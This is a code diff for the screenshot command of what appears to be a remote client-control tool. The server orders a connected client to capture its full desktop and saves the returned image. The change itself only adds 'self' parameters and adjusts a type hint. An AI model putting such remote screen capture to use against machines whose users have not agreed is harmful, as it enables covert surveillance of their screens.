@@ -2,7 +2,6 @@ from typing import TYPE_CHECKING
 import io, time
 
 from ..enums import PacketType
-
 from ..commands import CommandBase
 
 if TYPE_CHECKING:
@@ -16,7 +15,7 @@ class screenshotCommand(CommandBase):
     __description__ = "Take a screenshot from the client desktop"
     __extra__ = "Usage: `screenshot <Client ID>` | The screenshot will be saved to `client` directory"
 
-    def execute(netServer: "NetterServer", *args) -> bool:
+    def execute(self, netServer: "NetterServer", *args) -> "NetterClient":
         if not args and not netServer.selectedClient:
             netServer.inputHandler.handle("help screenshot")  # Sends usage information of this command
             return False
@@ -30,13 +29,13 @@ class screenshotCommand(CommandBase):
         client.socket_.send_(packetType=PacketType.COMMAND, data="screenshot")
         return client
 
-    def on_server_receive(netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse") -> None:
+    def on_server_receive(self, netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse") -> None:
         with open(f"{client.username}T{time.time()}.jpeg", "wb") as file:
             file.write(packet.data)
 
         netServer.console_log(f"Screenshot saved as {client.username}T{time.time()}.jpeg", level="INFO")
 
-    def on_client_receive(serverHandler: "Connect") -> str | bytes:
+    def on_client_receive(self, serverHandler: "Connect") -> str | bytes:
         from PIL import ImageGrab
 
         image = ImageGrab.grab().convert("RGB")
